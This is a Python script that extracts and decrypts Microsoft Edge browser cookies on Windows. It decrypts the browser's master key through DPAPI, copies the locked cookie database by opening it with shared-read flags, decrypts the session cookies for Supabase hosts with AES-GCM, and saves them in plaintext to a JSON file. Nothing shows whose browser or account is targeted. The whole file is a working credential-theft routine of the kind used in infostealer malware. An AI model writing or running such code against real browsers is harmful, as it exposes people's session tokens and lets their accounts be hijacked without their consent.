import os, json, base64, sqlite3, shutil, ctypes
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(data):
    blob_in = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = ctypes.string_at(pbData, cbData)
        ctypes.windll.kernel32.LocalFree(pbData)
        return buffer
    return None

try:
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = decrypt_dpapi(encrypted_key[5:])
    print('Master Key decrypted successfully:', key is not None, len(key) if key else 0)

    cookie_src = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies')
    temp_cookie = 'temp_cookies.db'
    
    # Read with shared permissions
    GENERIC_READ = 0x80000000
    FILE_SHARE_READ = 0x00000001
    FILE_SHARE_WRITE = 0x00000002
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80
    
    handle = ctypes.windll.kernel32.CreateFileW(
        cookie_src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
    )
    if handle == -1:
        print('Could not open cookie file handle')
        exit(1)
    
    # Get file size
    size = ctypes.windll.kernel32.GetFileSize(handle, None)
    buf = ctypes.create_string_buffer(size)
    bytes_read = wintypes.DWORD()
    ctypes.windll.kernel32.ReadFile(handle, buf, size, ctypes.byref(bytes_read), None)
    ctypes.windll.kernel32.CloseHandle(handle)
    
    with open(temp_cookie, 'wb') as dst:
        dst.write(buf.raw[:bytes_read.value])
    print(f'Copied {bytes_read.value} bytes from locked cookie file')

    conn = sqlite3.connect(temp_cookie)
    cursor = conn.cursor()
    cursor.execute("SELECT name, host_key, encrypted_value FROM cookies WHERE host_key LIKE '%supabase%'")
    rows = cursor.fetchall()
    print(f'Found {len(rows)} cookies')

    aesgcm = AESGCM(key)
    decrypted_cookies = {}
    for name, host, enc in rows:
        try:
            # v10 prefix (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            if enc.startswith(b'v10') or enc.startswith(b'v20'):
                nonce = enc[3:15]
                ciphertext = enc[15:]
                dec = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8', errors='ignore')
                print(f'{name} ({host}): length {len(dec)}')
                decrypted_cookies[name] = dec
            else:
                dec = decrypt_dpapi(enc).decode('utf-8', errors='ignore')
                print(f'{name} ({host}) [DPAPI]: length {len(dec)}')
                decrypted_cookies[name] = dec
        except Exception as e:
            print(f'Failed decrypting {name}: {e}')

    conn.close()
    if os.path.exists(temp_cookie): os.remove(temp_cookie)

    with open('supabase_cookies.json', 'w') as out:
        json.dump(decrypted_cookies, out, indent=2)
    print('Saved decrypted cookies to supabase_cookies.json')
except Exception as e:
    print('Error:', e)
